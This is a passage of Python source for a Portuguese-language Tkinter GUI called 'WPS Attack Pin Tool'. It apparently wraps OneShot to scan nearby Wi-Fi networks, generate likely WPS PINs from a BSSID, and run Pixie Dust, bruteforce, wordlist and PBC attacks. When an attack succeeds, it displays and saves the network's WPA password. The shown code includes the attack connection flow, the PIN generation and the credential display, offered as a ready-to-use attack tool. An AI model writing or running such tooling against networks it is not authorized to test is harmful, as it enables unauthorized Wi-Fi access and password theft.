            self.log(self._explain_wpas_not_ok_status(cmd, r), 'e')
            return False
        while self._running:
            res = self._handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose, bssid=bssid.lower())
            if not res or self.connection_status.status in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
                break
        self.sendOnly('WPS_CANCEL')
        return False

    def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False,
                          showpixiecmd=False, pixieforce=False):
        if not IS_LINUX: return None
        if not pin:
            if pixiemode:
                try:
                    with open('{}{}.run'.format(self.pixiewps_dir, bssid.replace(':', '').upper()), 'r') as f:
                        pin = f.readline().strip()
                        self.log('PIN anterior encontrado: {}'.format(pin))
                except: pin = self.generator.getLikely(bssid) or '12345670'
            elif not pbc_mode:
                self.log('Nenhum PIN, usando PIN provavel')
                pin = self.generator.getLikely(bssid) or '12345670'
        if pbc_mode:
            self._wps_connection(bssid, pbc_mode=pbc_mode)
            bssid = getattr(self.connection_status, 'bssid', bssid)
            pin = '<PBC mode>'
        else:
            self._wps_connection(bssid, pin, pixiemode)
        if self.connection_status.status == 'GOT_PSK':
            result = {'pin': pin, 'psk': self.connection_status.wpa_psk,
                      'essid': self.connection_status.essid, 'bssid': bssid}
            self.log('=' * 50, 's')
            self.log('[+] WPS PIN: {}'.format(pin), 's')
            self.log('[+] WPA PSK SENHA: {}'.format(self.connection_status.wpa_psk), 's')
            self.log('[+] SSID: {}'.format(self.connection_status.essid), 's')
            self.log('=' * 50, 's')
            return result
        elif pixiemode and self.pixie_creds.got_all():
            pin = self._runPixiewps(showpixiecmd, pixieforce)
            if pin:
                self.log('[+] PIN calculado pelo Pixiewps: {}'.format(pin), 's')
                return self.single_connection(bssid, pin, pixiemode=False, showpixiecmd=showpixiecmd, pixieforce=pixieforce)
            return None
        return None

    def generate_pins_list(self, bssid): return self.generator.getSuggested(bssid)

    def cleanup(self):
        try:
            self._running = False
            if IS_LINUX:
                self.retsock.close()
                if hasattr(self, 'wpas') and self.wpas: self.wpas.terminate()
                if os.path.exists(self.res_socket_file): os.remove(self.res_socket_file)
                shutil.rmtree(self.tempdir, ignore_errors=True)
                if os.path.exists(self.tempconf): os.remove(self.tempconf)
        except: pass

    def __del__(self):
        try: self.cleanup()
        except: pass


# ============================================================
# INTERFACE GRAFICA — FUNDO PRETO + VERDE
# ============================================================

import platform

class OneShotGUI:

    def __init__(self, root):
        self.root = root
        self.root.title("WPS Attack Pin")
        self.root.geometry("1100x800")

        sistema = platform.system()

        if sistema == "Windows":
            self.root.state("zoomed")

        elif sistema == "Linux":
            try:
                self.root.state("zoomed")
            except Exception:
                try:
                    self.root.attributes("-zoomed", True)
                except Exception:
                    pass

        self.root.resizable(True, True)     
        
        self.root.minsize(900, 700)
        try:
            icon_path = os.path.join(os.path.dirname(__file__), 'icon.ico')
            if os.path.exists(icon_path): self.root.iconbitmap(icon_path)
        except: pass

        self.companion = None
        self.scanner = None
        self.attack_thread = None
        self.scan_thread = None
        self._running = False
        self.networks_list = []
        self.selected_bssid = None
        self.generator = WPSpin()
        self.wordlist_pins = []
        self.wordlist_index = 0
        self.reports_dir = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'reports')
        if not os.path.exists(self.reports_dir): os.makedirs(self.reports_dir)

        self.var_interface = tk.StringVar(value='wlan0' if IS_LINUX else 'Wi-Fi')
        self.var_pin = tk.StringVar()
        self.var_delay = tk.StringVar(value='0')
        self.var_save = tk.BooleanVar(value=True)
        self.var_pixie = tk.BooleanVar(value=True)
        self.var_bruteforce = tk.BooleanVar(value=False)
        self.var_pbc = tk.BooleanVar(value=False)
        self.var_verbose = tk.BooleanVar(value=False)
        self.var_pixie_force = tk.BooleanVar(value=False)
        self.var_show_cmd = tk.BooleanVar(value=False)
        self.var_loop = tk.BooleanVar(value=False)
        self.var_wordlist = tk.BooleanVar(value=False)

        self.log_queue = queue.Queue()
        self.scan_queue = queue.Queue()
        self.result_queue = queue.Queue()

        self._build_ui()
        self.root.after(100, self._poll_queues)

        so_str = 'Windows 10/11' if IS_WINDOWS else 'Kali Linux / Linux'
        self.log('WPS Attack Pin Tool (Green Edition) em {}'.format(so_str), 'info')
        if IS_WINDOWS:
            self.log('[!] Modo Windows: scan via netsh. Ataque WPS requer Linux.', 'warning')
            self.log('[!] Geracao de PIN disponivel.', 'info')
        else:
            self.log('[+] Modo Linux: scan + ataque WPS completo.', 'success')

    def _build_ui(self):
        # ===== TEMA ESCURO — FUNDO PRETO + VERDE =====
        bg_main = '#000000'
        bg_frame = '#0a0a0a'
        bg_entry = '#1a1a1a'
        fg_main = '#d4d4d4'
        fg_dim = '#888888'

        # VERDE: substituiu completamente o azul
        green_primary = "#06f52e"      # verde agua (info, headings)
        green_select = '#1a5a3a'       # selecao (antes #264f78)
        green_status = "#008a00"       # barra de status (antes #007acc)
        green_light = "#09f871"        # labels claros (antes #9cdcfe)
        green_bright = '#00ff88'       # verde brilhante para destaque

        style = ttk.Style()
        style.theme_use('clam')

        style.configure('.',
            background=bg_main, foreground=fg_main,
            fieldbackground=bg_entry, troughcolor=bg_main,
            selectbackground=green_select, selectforeground='#ffffff')

        style.configure('TFrame', background=bg_frame)
        style.configure('TLabelframe', background=bg_frame, foreground=fg_main, bordercolor='#333333')
        style.configure('TLabelframe.Label', background=bg_frame, foreground=green_primary,
                        font=('Segoe UI', 9, 'bold'))
        style.configure('TLabel', background=bg_frame, foreground=fg_main)
        style.configure('TButton', background='#2a2a2a', foreground=fg_main,
                        borderwidth=1, focusthickness=2, relief=tk.FLAT)
        style.map('TButton', background=[('active', '#3a3a3a'), ('disabled', '#1a1a1a')],
                  foreground=[('disabled', '#555555')])
        style.configure('TEntry', fieldbackground=bg_entry, foreground=fg_main,
                        insertcolor=fg_main, bordercolor='#444444')
        style.map('TEntry', fieldbackground=[('focus', '#222222')])
        style.configure('TCheckbutton', background=bg_frame, foreground=fg_main)
        style.map('TCheckbutton', background=[('active', bg_frame)], foreground=[('active', fg_main)])

        style.configure('Treeview', background=bg_main, foreground=fg_main,
                        fieldbackground=bg_main, bordercolor='#333333', relief=tk.FLAT)
        style.map('Treeview', background=[('selected', green_select)],
                  foreground=[('selected', '#ffffff')])
        
        style.configure('Treeview.Heading', background='#1a1a1a', foreground=green_primary,
                        fieldbackground='#1a1a1a', bordercolor='#333333', relief=tk.FLAT)
        style.map('Treeview.Heading', background=[('active', '#2a2a2a')])

        style.configure('Vertical.TScrollbar', background='#2a2a2a', troughcolor=bg_main,
                        bordercolor=bg_main, arrowcolor=fg_main)
        style.map('Vertical.TScrollbar', background=[('active', '#3a3a3a')])

        self.root.configure(bg=bg_main)

        # ===== MENU =====
        menubar = tk.Menu(self.root, bg='#1a1a1a', fg=fg_main,
                          activebackground=green_select, activeforeground='#ffffff',
                          borderwidth=0, relief=tk.FLAT)
        file_menu = tk.Menu(menubar, tearoff=0, bg='#1a1a1a', fg=fg_main,
                           activebackground=green_select, activeforeground='#ffffff',
                           borderwidth=0, relief=tk.FLAT)
        file_menu.add_command(label='Carregar Wordlist...', command=self._load_wordlist)
        file_menu.add_separator(background='#333333')
        file_menu.add_command(label='Salvar relatorio...', command=self._save_report)
        file_menu.add_separator(background='#333333')
        file_menu.add_command(label='Sair', command=self._on_close)
        menubar.add_cascade(label='Arquivo', menu=file_menu)

        tools_menu = tk.Menu(menubar, tearoff=0, bg='#1a1a1a', fg=fg_main,
                            activebackground=green_select, activeforeground='#ffffff',
                            borderwidth=0, relief=tk.FLAT)
        tools_menu.add_command(label='Gerar PIN para BSSID manual...', command=self._manual_pin_gen)
        tools_menu.add_command(label='Limpar Log', command=self._clear_log)
        menubar.add_cascade(label='Ferramentas', menu=tools_menu)

        about_menu = tk.Menu(menubar, tearoff=0, bg='#1a1a1a', fg=fg_main,
                            activebackground=green_select, activeforeground='#ffffff',
                            borderwidth=0, relief=tk.FLAT)
        about_menu.add_command(label='Sobre', command=self._show_about)
        menubar.add_cascade(label='Ajuda', menu=about_menu)

        self.root.config(menu=menubar)

        # ===== FRAME PRINCIPAL =====
        main_frame = ttk.Frame(self.root, padding=10)
        main_frame.pack(fill=tk.BOTH, expand=True)

        # ===== TOPO =====
        top_frame = ttk.LabelFrame(main_frame, text='Controle', padding=10)
        top_frame.pack(fill=tk.X, pady=(0, 5))
        for child in top_frame.winfo_children():
            if isinstance(child, (ttk.Frame, ttk.LabelFrame)):
                child.configure(style='TFrame')

        ttk.Label(top_frame, text='Interface:').grid(row=0, column=0, sticky=tk.W, padx=5)
        self.entry_iface = ttk.Entry(top_frame, textvariable=self.var_interface, width=18)
        self.entry_iface.grid(row=0, column=1, sticky=tk.W, padx=5)
        ttk.Style().configure("GreenBlue.TButton", background="#008F6B", foreground="black", font=("Arial", 10, "bold")); self.btn_scan = ttk.Button(top_frame, text="Escanear Redes", command=self._scan_networks, style="GreenBlue.TButton")
        self.btn_scan.grid(row=0, column=2, padx=5)
        self.btn_stop = ttk.Button(top_frame, text='Parar', command=self._stop_attack, state=tk.DISABLED)
        self.btn_stop.grid(row=0, column=3, padx=5)
        self.lbl_os = ttk.Label(top_frame, text='[{}]'.format('Windows' if IS_WINDOWS else 'Linux'),
                                foreground=green_bright if IS_LINUX else green_primary)
        self.lbl_os.grid(row=0, column=4, padx=5)

        ttk.Label(top_frame, text='Modo:').grid(row=1, column=0, sticky=tk.W, padx=5)
        mode_frame = ttk.Frame(top_frame)
        mode_frame.grid(row=1, column=1, columnspan=4, sticky=tk.W, padx=5)
        self.chk_pixie = ttk.Checkbutton(mode_frame, text='Pixie Dust', variable=self.var_pixie)
        self.chk_pixie.pack(side=tk.LEFT, padx=2)
        self.chk_brute = ttk.Checkbutton(mode_frame, text='Bruteforce', variable=self.var_bruteforce)
        self.chk_brute.pack(side=tk.LEFT, padx=2)
        self.chk_pbc = ttk.Checkbutton(mode_frame, text='PBC', variable=self.var_pbc)
        self.chk_pbc.pack(side=tk.LEFT, padx=2)
        self.chk_wordlist = ttk.Checkbutton(mode_frame, text='Wordlist', variable=self.var_wordlist)
        self.chk_wordlist.pack(side=tk.LEFT, padx=2)

        ttk.Label(top_frame, text='PIN:').grid(row=2, column=0, sticky=tk.W, padx=5)
        self.entry_pin = ttk.Entry(top_frame, textvariable=self.var_pin, width=15)
        self.entry_pin.grid(row=2, column=1, sticky=tk.W, padx=5)
        ttk.Style().configure("Blue.TButton", background="#0AD0F3", foreground="black", font=("Arial", 10, "bold")); self.btn_wl = ttk.Button(top_frame, text="Selecionar Wordlist", command=self._load_wordlist, style="Blue.TButton")
        self.btn_wl.grid(row=2, column=2, padx=5)
        self.chk_save = ttk.Checkbutton(top_frame, text='Salvar credenciais', variable=self.var_save)
        self.chk_save.grid(row=2, column=3, padx=5)

        ttk.Label(top_frame, text='Delay:').grid(row=2, column=4, sticky=tk.W, padx=5)
        self.entry_delay = ttk.Entry(top_frame, textvariable=self.var_delay, width=6)
        self.entry_delay.grid(row=2, column=5, sticky=tk.W, padx=5)

        ttk.Style().configure("Green.TButton", background="#00FF00", foreground="black", font=("Arial", 10, "bold")); self.btn_attack = ttk.Button(top_frame, text="Iniciar Ataque", command=self._start_attack, style="Green.TButton")
        self.btn_attack.grid(row=3, column=0, columnspan=2, pady=5, sticky=tk.W, padx=5)
        adv_frame = ttk.Frame(top_frame)
        adv_frame.grid(row=3, column=2, columnspan=4, sticky=tk.W, padx=5)
        self.chk_verbose = ttk.Checkbutton(adv_frame, text='Verbose', variable=self.var_verbose)
        self.chk_verbose.pack(side=tk.LEFT, padx=2)
        self.chk_force = ttk.Checkbutton(adv_frame, text='Pixie Force', variable=self.var_pixie_force)
        self.chk_force.pack(side=tk.LEFT, padx=2)
        self.chk_showcmd = ttk.Checkbutton(adv_frame, text='Mostrar CMD', variable=self.var_show_cmd)
        self.chk_showcmd.pack(side=tk.LEFT, padx=1)
        self.chk_loop = ttk.Checkbutton(adv_frame, text='Loop', variable=self.var_loop)
        self.chk_loop.pack(side=tk.LEFT, padx=2)
        ttk.Button(top_frame, text='Gerar PIN', command=self._manual_pin_gen).grid(
            row=3, column=4, padx=80, sticky=tk.W)

        # ===== TREEVIEW =====
        table_frame = ttk.LabelFrame(main_frame, text='Redes WPS Detectadas', padding=5)
        table_frame.pack(fill=tk.BOTH, expand=True, pady=5)

        columns = ('bssid', 'essid', 'sec', 'pwr', 'pwr_bar', 'device', 'model', 'locked')
        self.tree = ttk.Treeview(table_frame, columns=columns, show='headings', selectmode='browse', height=8)
        self.tree.heading('bssid', text='BSSID')
        self.tree.heading('essid', text='ESSID')
        self.tree.heading('sec', text='Seguranca')
        self.tree.heading('pwr', text='Sinal')
        self.tree.heading('pwr_bar', text='')
        self.tree.heading('device', text='Dispositivo')
        self.tree.heading('model', text='Modelo')
        self.tree.heading('locked', text='Bloqueado')

        self.tree.column('bssid', width=150, minwidth=120)
        self.tree.column('essid', width=160, minwidth=100)
        self.tree.column('sec', width=80, minwidth=60)
        self.tree.column('pwr', width=45, minwidth=40, anchor=tk.CENTER)
        self.tree.column('pwr_bar', width=120, minwidth=80, anchor=tk.CENTER)
        self.tree.column('device', width=150, minwidth=100)
        self.tree.column('model', width=120, minwidth=80)
        self.tree.column('locked', width=65, minwidth=40, anchor=tk.CENTER)

        scroll_tree = ttk.Scrollbar(table_frame, orient=tk.VERTICAL, command=self.tree.yview)
        self.tree.configure(yscrollcommand=scroll_tree.set)
        scroll_tree.pack(side=tk.RIGHT, fill=tk.Y)
        self.tree.pack(fill=tk.BOTH, expand=True)

        # Tags VERDE
        self.tree.tag_configure('excellent', background=bg_main, foreground=green_bright)
        self.tree.tag_configure('good', background=bg_main, foreground=green_primary)
        self.tree.tag_configure('fair', background=bg_main, foreground='#dcdcaa')
        self.tree.tag_configure('weak', background=bg_main, foreground='#ce9178')
        self.tree.tag_configure('poor', background=bg_main, foreground='#f44747')
        self.tree.tag_configure('locked', background=bg_main, foreground='#f44747', font=('Segoe UI', 9, 'bold'))
        self.tree.tag_configure('unlocked', background=bg_main, foreground=green_bright)

        # Forca fundo preto no Treeview
        # Tags VERDE
        self.tree.tag_configure('excellent', background=bg_main, foreground=green_bright)
        self.tree.tag_configure('good', background=bg_main, foreground=green_primary)
        self.tree.tag_configure('fair', background=bg_main, foreground='#dcdcaa')
        self.tree.tag_configure('weak', background=bg_main, foreground='#ce9178')
        self.tree.tag_configure('poor', background=bg_main, foreground='#f44747')
        self.tree.tag_configure(
            'locked',
            background=bg_main,
            foreground='#f44747',
            font=('Segoe UI', 9, 'bold')
        )
        self.tree.tag_configure(
            'unlocked',
            background=bg_main,
            foreground=green_bright
        )

        # NÃO precisa de ttk::style map aqui

        self.tree.bind('<<TreeviewSelect>>', self._on_select_network)
        self.tree.bind('<Double-1>', lambda e: self._start_attack())

        # ===== RESULTADOS =====
        result_frame = ttk.LabelFrame(main_frame, text='Resultados', padding=5)
        result_frame.pack(fill=tk.X, pady=5)

        self.result_text = tk.Text(result_frame, height=5, font=('Consolas', 11, 'bold'),
                                    state=tk.DISABLED, bg='#000000', fg='#d4d4d4',
                                    relief=tk.FLAT, borderwidth=0, padx=5, pady=5,
                                    highlightthickness=0, insertbackground=fg_main)
        scroll_result = ttk.Scrollbar(result_frame, orient=tk.VERTICAL, command=self.result_text.yview)
        self.result_text.configure(yscrollcommand=scroll_result.set)
        scroll_result.pack(side=tk.RIGHT, fill=tk.Y)
        self.result_text.pack(fill=tk.X)

        # Tags VERDE
        self.result_text.tag_configure('header', foreground=green_bright, font=('Consolas', 12, 'bold'))
        self.result_text.tag_configure('pin_label', foreground='#c586c0', font=('Consolas', 11, 'bold'))
        self.result_text.tag_configure('pin_value', foreground='#d4d4d4', font=('Consolas', 13, 'bold'))
        self.result_text.tag_configure('psk_label', foreground='#d7ba7d', font=('Consolas', 11, 'bold'))
        self.result_text.tag_configure('psk_value', foreground=green_bright, font=('Consolas', 13, 'bold'))
        self.result_text.tag_configure('ssid_label', foreground=green_light, font=('Consolas', 11, 'bold'))
        self.result_text.tag_configure('ssid_value', foreground='#d4d4d4', font=('Consolas', 12))
        self.result_text.tag_configure('divider', foreground=green_primary, font=('Consolas', 10))
        self.result_text.tag_configure('fail', foreground='#f44747', font=('Consolas', 12, 'bold'))
        self.result_text.tag_configure('warning', foreground='#dcdcaa', font=('Consolas', 10))

        # ===== LOG =====
        log_frame = ttk.LabelFrame(main_frame, text='Log', padding=5)
        log_frame.pack(fill=tk.BOTH, expand=True, pady=5)

        log_header = ttk.Frame(log_frame)
        log_header.pack(fill=tk.X)
        ttk.Label(log_header, text='Eventos:', font=('Segoe UI', 8)).pack(side=tk.LEFT)
        ttk.Button(log_header, text='Limpar', command=self._clear_log, width=8).pack(side=tk.RIGHT)

        self.log_text = tk.Text(log_frame, height=10, font=('Consolas', 9),
                                 state=tk.DISABLED, wrap=tk.WORD,
                                 bg='#000000', fg='#d4d4d4', relief=tk.FLAT,
                                 borderwidth=0, padx=5, pady=5,
                                 highlightthickness=0, insertbackground=fg_main)
        scroll_log = ttk.Scrollbar(log_frame, orient=tk.VERTICAL, command=self.log_text.yview)
        self.log_text.configure(yscrollcommand=scroll_log.set)
        scroll_log.pack(side=tk.RIGHT, fill=tk.Y)
        self.log_text.pack(fill=tk.BOTH, expand=True)

        # Tags — info agora e VERDE
        self.log_text.tag_configure('info', foreground=green_primary)
        self.log_text.tag_configure('success', foreground=green_bright)
        self.log_text.tag_configure('error', foreground='#f44747')
        self.log_text.tag_configure('warning', foreground='#dcdcaa')
        self.log_text.tag_configure('debug', foreground='#6a9955')
        self.log_text.tag_configure('highlight', foreground='#ce9178')
        self.log_text.tag_configure('timestamp', foreground='#6a9955')

        # ===== BARRA DE STATUS VERDE =====
        self.status_bar = tk.Label(self.root, text='Pronto', relief=tk.FLAT, anchor=tk.W,
                                   bg=green_status, fg="#080808", font=('Segoe UI', 9, 'bold'),
                                   borderwidth=1, highlightbackground='#333333')
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)

        self.log('OneShotPin Green Edition iniciado. Selecione uma interface e escaneie.', 'info')
        self.root.protocol('WM_DELETE_WINDOW', self._on_close)

    def log(self, msg, level='info'):
        self.log_queue.put((msg, level))

    def _process_log(self, msg, level):
        tag_map = {'i': 'info', 's': 'success', 'e': 'error', 'd': 'debug', 'w': 'warning',
                   'info': 'info', 'success': 'success', 'error': 'error',
                   'debug': 'debug', 'warning': 'warning', 'highlight': 'highlight'}
        tag = tag_map.get(level, 'info')
        try:
            self.log_text.config(state=tk.NORMAL)
            timestamp = datetime.now().strftime('%H:%M:%S')
            self.log_text.insert(tk.END, '[{}] '.format(timestamp), 'timestamp')
            self.log_text.insert(tk.END, '{}\n'.format(msg), tag)
            self.log_text.see(tk.END)
            self.log_text.config(state=tk.DISABLED)
            self.status_bar.config(text=msg[:80])
        except: pass

    def _clear_log(self):
        self.log_text.config(state=tk.NORMAL)
        self.log_text.delete(1.0, tk.END)
        self.log_text.config(state=tk.DISABLED)

    def _show_result_success(self, result):
        self.result_text.config(state=tk.NORMAL)
        self.result_text.delete(1.0, tk.END)
        pin = result.get('pin', '?')
        psk = result.get('psk', '?')
        essid = result.get('essid', '?')
        bssid = result.get('bssid', '?')
        self.result_text.insert(tk.END, '=== CREDENCIAIS OBTIDAS ===\n', 'header')
        self.result_text.insert(tk.END, '-' * 45 + '\n', 'divider')
        self.result_text.insert(tk.END, 'WPS PIN:     ', 'pin_label')
        self.result_text.insert(tk.END, '{}\n'.format(pin), 'pin_value')
        self.result_text.insert(tk.END, 'WPA PSK SENHA: ', 'psk_label')
        self.result_text.insert(tk.END, '{}\n'.format(psk), 'psk_value')
        self.result_text.insert(tk.END, 'SSID:        ', 'ssid_label')
        self.result_text.insert(tk.END, '{}\n'.format(essid), 'ssid_value')
        self.result_text.insert(tk.END, 'BSSID:       ', 'ssid_label')
        self.result_text.insert(tk.END, '{}\n'.format(bssid), 'ssid_value')
        self.result_text.insert(tk.END, '-' * 45, 'divider')
        self.result_text.config(state=tk.DISABLED)

    def _show_result_fail(self):
        self.result_text.config(state=tk.NORMAL)
        self.result_text.delete(1.0, tk.END)
        self.result_text.insert(tk.END, '=== ATAQUE FALHOU ===\n', 'header')
        self.result_text.insert(tk.END, '-' * 35 + '\n', 'divider')
        self.result_text.insert(tk.END, 'PIN incorreto ou timeout.\n', 'fail')
        self.result_text.insert(tk.END, 'Tente outro PIN, Pixie Dust\n', 'warning')
        self.result_text.insert(tk.END, 'ou modo PBC.\n', 'warning')
        self.result_text.insert(tk.END, '-' * 35, 'divider')
        self.result_text.config(state=tk.DISABLED)

    def _show_about(self):
        messagebox.showinfo('Sobre',
            'WPS Attack Pin Tool v2.0 Green Edition\n'
            'Multi-Platform (Linux + Windows 10/11)\n\n'
            'Fundo preto + tema verde\n'
            'Linux: scan + ataque WPS completo\n'
            'Windows: scan (netsh) + geracao de PIN')

    def _load_wordlist(self):
        fname = filedialog.askopenfilename(title='Selecionar wordlist de PIN',
            filetypes=[('Texto', '*.txt'), ('Todos', '*.*')])
        if not fname: return
        try:
            with open(fname, 'r') as f: lines = f.read().splitlines()
            self.wordlist_pins = []
            for line in lines:
                pin = line.strip()
                if pin.isdigit() and len(pin) in (4, 8):
                    self.wordlist_pins.append(pin)
                elif pin.isdigit() and len(pin) == 7:
                    from_wps = WPSpin()
                    cs = from_wps.checksum(int(pin))
                    self.wordlist_pins.append(pin + str(cs))
            self.wordlist_index = 0
            self.var_wordlist.set(True)
            self.log('Wordlist carregada: {} PIN de {}'.format(
                len(self.wordlist_pins), os.path.basename(fname)), 'success')
            if self.wordlist_pins: self.var_pin.set(self.wordlist_pins[0])
        except Exception as e:
            self.log('Erro ao carregar wordlist: {}'.format(str(e)), 'error')

    def _manual_pin_gen(self):
        win = tk.Toplevel(self.root)
        win.title('Gerador de PIN WPS')
        win.geometry('880x780')
        win.configure(bg='#000000')

        frame = ttk.Frame(win, padding=15)
        frame.pack(fill=tk.BOTH, expand=True)

        ttk.Label(frame, text='BSSID (ex: AA:BB:CC:DD:EE:FF):').pack(anchor=tk.W)
        bssid_var = tk.StringVar()
        if self.selected_bssid: bssid_var.set(self.selected_bssid)
        entry_bssid = ttk.Entry(frame, textvariable=bssid_var, width=25, font=('Consolas', 11))
        entry_bssid.pack(fill=tk.X, pady=5)

        result_frame = ttk.Frame(frame)
        result_frame.pack(fill=tk.BOTH, expand=True, pady=10)

        text_pins = tk.Text(result_frame, font=('Consolas', 10), bg='#000000', fg='#d4d4d4',
                            relief=tk.FLAT, wrap=tk.WORD, padx=5, pady=5,
                            highlightthickness=0, insertbackground='#d4d4d4')
        scroll_pins = ttk.Scrollbar(result_frame, orient=tk.VERTICAL, command=text_pins.yview)
        text_pins.configure(yscrollcommand=scroll_pins.set)
        scroll_pins.pack(side=tk.RIGHT, fill=tk.Y)
        text_pins.pack(fill=tk.BOTH, expand=True)

        text_pins.tag_configure('pin_item', foreground='#ce9178')
        text_pins.tag_configure('pin_name', foreground='#4ec9b0')  # VERDE
        text_pins.tag_configure('pin_val', foreground='#00ff88', font=('Consolas', 11, 'bold'))  # VERDE BRILHANTE

        def generate():
            bssid = bssid_var.get().strip().upper()
            if not bssid: messagebox.showerror('Erro', 'Informe o BSSID'); return
            bssid = bssid.replace('-', ':').replace('.', ':')
            if not re.match(r'^([0-9A-F]{2}:){5}[0-9A-F]{2}$', bssid):
                messagebox.showerror('Erro', 'BSSID invalido'); return
            text_pins.delete(1.0, tk.END)
            generator = WPSpin()
            pins = generator.getAll(bssid, get_static=True)
            text_pins.insert(tk.END, 'PIN sugeridos para {}\n\n'.format(bssid), 'pin_name')
            suggested_ids = [s['id'] for s in generator.getSuggested(bssid)]
            for p in pins:
                is_suggested = p['id'] in suggested_ids
                prefix = '[RECOMENDADO] ' if is_suggested else '             '
                name = p['name']; pin_val = p['pin']
                tag = 'pin_val' if is_suggested else 'pin_item'
                text_pins.insert(tk.END, '{} {}\n'.format(prefix, name), 'pin_name')
                text_pins.insert(tk.END, '{}      PIN: {}\n\n'.format(' ' * 13, pin_val), tag)
            text_pins.see(1.0)

        btn_frame = ttk.Frame(frame)
        btn_frame.pack(fill=tk.X, pady=5)
        ttk.Button(btn_frame, text='Gerar PIN', command=generate).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text='Copiar PIN', command=lambda: self._copy_pins(text_pins)).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text='Salvar PIN em .txt', command=self._save_pins_to_txt).pack(side=tk.LEFT, padx=5)

    def _copy_pins(self, text_widget):
        content = text_widget.get(1.0, tk.END).strip()
        self.root.clipboard_clear()
        self.root.clipboard_append(content)
        self.log('PIN copiados para area de transferencia', 'success')

    def _scan_networks(self):
        iface = self.var_interface.get().strip()
        if not iface: messagebox.showerror('Erro', 'Informe a interface'); return
        self.btn_scan.config(state=tk.DISABLED, text='Escaneando...')
        self._clear_tree()
        self.networks_list = []
        self.scan_thread = threading.Thread(target=self._do_scan, args=(iface,), daemon=True)
        self.scan_thread.start()

    def _do_scan(self, iface):
        try:
            vuln_file = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'vulnwsc.txt')
            try: vuln_list = open(vuln_file, 'r').read().splitlines()
            except: vuln_list = []
            scanner = WiFiScanner(iface, vuln_list, callback_log=lambda m, l: self.log(m, l))
            networks = scanner.scan()
            self.scan_queue.put(networks)
        except Exception as e: self.scan_queue.put(('error', str(e)))

    def _process_scan(self, data):
        if isinstance(data, tuple) and data[0] == 'error':
            self.log('Erro no scan: {}'.format(data[1]), 'error')
            self.btn_scan.config(state=tk.NORMAL, text='Escanear Redes')
            return
        networks = data
        if not networks:
            self.log('Nenhuma rede WPS encontrada.', 'error')
            self.btn_scan.config(state=tk.NORMAL, text='Escanear Redes')
            return
        self.networks_list = networks
        self._clear_tree()
        for net in networks:
            essid = net.get('ESSID', 'HIDDEN') or 'HIDDEN'
            bssid = net['BSSID']; level = net.get('Level', 0); locked = net.get('WPS locked', False)
            try:
                dbm = int(level)
                if dbm >= -50: tag_signal = 'excellent'; pwr_bar = '████████████'
                elif dbm >= -60: tag_signal = 'good'; pwr_bar = '██████████'
                elif dbm >= -70: tag_signal = 'fair'; pwr_bar = '████████'
                elif dbm >= -80: tag_signal = 'weak'; pwr_bar = '██████'
                else: tag_signal = 'poor'; pwr_bar = '████'
            except: tag_signal = 'fair'; pwr_bar = '--'
            locked_str = 'LOCKED' if locked else 'OK'
            locked_tag = 'locked' if locked else 'unlocked'
            self.tree.insert('', tk.END,
                values=(bssid, essid, net.get('Security type', '?'),
                        '{} dBm'.format(level), pwr_bar,
                        net.get('Device name', ''),
                        '{} {}'.format(net.get('Model', ''), net.get('Model number', '')).strip(),
                        locked_str),
                tags=(tag_signal, locked_tag))
        self.log('{} redes WPS encontradas.'.format(len(networks)), 'success')
        self.log('Dica: Clique duplo em uma rede para iniciar ataque.', 'info')
        self.btn_scan.config(state=tk.NORMAL, text='Escanear Redes')

    def _clear_tree(self):
        for item in self.tree.get_children(): self.tree.delete(item)

    def _on_select_network(self, event):
        selection = self.tree.selection()
        if selection:
            item = self.tree.item(selection[0])
            self.selected_bssid = item['values'][0]
            self.log('Selecionado: {} ({})'.format(self.selected_bssid, item['values'][1]), 'info')

    def _start_attack(self):
        iface = self.var_interface.get().strip()
        if not iface: messagebox.showerror('Erro', 'Informe a interface'); return
        if not self.selected_bssid:
            selection = self.tree.selection()
            if selection: self.selected_bssid = self.tree.item(selection[0])['values'][0]
            else: messagebox.showerror('Erro', 'Selecione uma rede'); return
        if self._running: messagebox.showwarning('Aviso', 'Ataque ja em andamento'); return
        if IS_WINDOWS: self._run_windows_pin_generation(); return

        self._running = True
        self.btn_attack.config(state=tk.DISABLED, text='Atacando...')
        self.btn_stop.config(state=tk.NORMAL)
        self.result_text.config(state=tk.NORMAL); self.result_text.delete(1.0, tk.END); self.result_text.config(state=tk.DISABLED)

        pin = self.var_pin.get().strip() or None
        delay = float(self.var_delay.get()) if self.var_delay.get() else 0
        pixie = self.var_pixie.get(); brute = self.var_bruteforce.get()
        pbc = self.var_pbc.get(); use_wordlist = self.var_wordlist.get()

        self.attack_thread = threading.Thread(target=self._do_attack,
            args=(iface, self.selected_bssid, pin, pixie, brute, pbc, delay, use_wordlist), daemon=True)
        self.attack_thread.start()

    def _run_windows_pin_generation(self):
        bssid = self.selected_bssid
        if not bssid: return
        self.log('=== MODO WINDOWS: Gerando PIN para {} ==='.format(bssid), 'highlight')
        pins = WPSpin().getSuggested(bssid)
        self.result_text.config(state=tk.NORMAL); self.result_text.delete(1.0, tk.END)
        self.result_text.insert(tk.END, '=== PIN WPS GERADOS ===\n', 'header')
        self.result_text.insert(tk.END, 'Alvo: {}\n\n'.format(bssid), 'ssid_value')
        self.result_text.insert(tk.END, '-' * 40 + '\n', 'divider')
        for i, p in enumerate(pins[:10], 1):
            self.result_text.insert(tk.END, '{}. {}:\n'.format(i, p['name']), 'pin_name')
            self.result_text.insert(tk.END, '   PIN: {}\n\n'.format(p['pin']), 'pin_value')
        self.result_text.insert(tk.END, '-' * 40 + '\n', 'divider')
        self.result_text.insert(tk.END, 'Use esses PIN em ataque manual no Linux.', 'warning')
        self.result_text.config(state=tk.DISABLED)
        for p in pins[:10]: self.log('PIN sugerido [{}]: {}'.format(p['name'], p['pin']), 'success')

    def _do_attack(self, iface, bssid, pin, pixie, brute, pbc, delay, use_wordlist):
        try:
            if IS_LINUX:
                self.log('Ativando interface {}...'.format(iface))
                if not ifaceUp(iface):
                    self.log('Falha ao ativar interface {}'.format(iface), 'error')
                    self.result_queue.put(('done', None)); return
            self.log('Iniciando ataque contra {}'.format(bssid), 'highlight')
